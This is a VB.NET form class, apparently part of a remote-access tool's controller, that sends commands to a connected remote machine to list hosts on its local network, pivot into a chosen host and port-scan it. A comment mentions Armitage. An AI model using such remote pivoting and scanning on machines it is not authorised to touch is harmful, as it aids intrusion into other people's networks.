Imports System.Windows.Forms.ListView

Public Class Lan
    Public xSize As System.Drawing.Size
    Public i As Integer = 0
    Public jj As Integer = 0
    Public sock As Integer
    Private Sub Lan_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ListView1.Items.Clear()
        Form1.s.Send(sock, "getlan")

        xSize.Height = 48
        xSize.Width = 48

    End Sub
    Sub check()

    End Sub
    Sub lanPcsinArmitage()






        '  ImageList1.Images.Add("s", My.Resources.PCo)
        ' Dim items As ListViewItemCollection = ListView1.Items
        '  SyncLock items
        'Dim enumerator As IEnumerator = Nothing
        ' Try
        '   enumerator = ListView1.Items.GetEnumerator
        '    Do While enumerator.MoveNext
        '   Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
        ' current.ImageKey = "s"
        '  Loop
        '  Finally
        '   If TypeOf enumerator Is IDisposable Then
        'TryCast(enumerator, IDisposable).Dispose()
        ' End If
        ' End Try
        ' End SyncLock
    End Sub
    Dim added As Boolean = False

    Private Sub RefreshLansToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshLansToolStripMenuItem.Click
        ListView1.Items.Clear()
        i = 0
        Form1.s.Send(sock, "getlan")
        addlinux()
    End Sub
    Private Sub addlinux()
        If added = False Then
            ListView1.Items.Add("192.168.1.1")
            ListView1.Items(i).ImageIndex = 2
            i += 1

        Else
            Exit Sub
        End If
        
    End Sub
    Public Sub aa()
        ListView1.SmallImageList = ImageList1
        Dim l1 = ListView1.Items.Add("")
        ListView1.Items(i).ImageIndex = 0


        ListView1.SmallImageList = ImageList1
        i += 1
    End Sub


    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Form1.s.Send(sock, "enterlan" & Form1.yy & pcname)
    End Sub

  
    Private Sub OpenPortScannerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenPortScannerToolStripMenuItem.Click
        ListView2.Items.Clear()
        i = 0
        Dim port1 = InputBox("Enter Start Port")
        Dim port2 = InputBox("Enter Start Port")
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Form1.s.Send(sock, "scanlan" & Form1.yy & pcname & Form1.yy & port1 & Form1.yy & port2)
    End Sub
End Class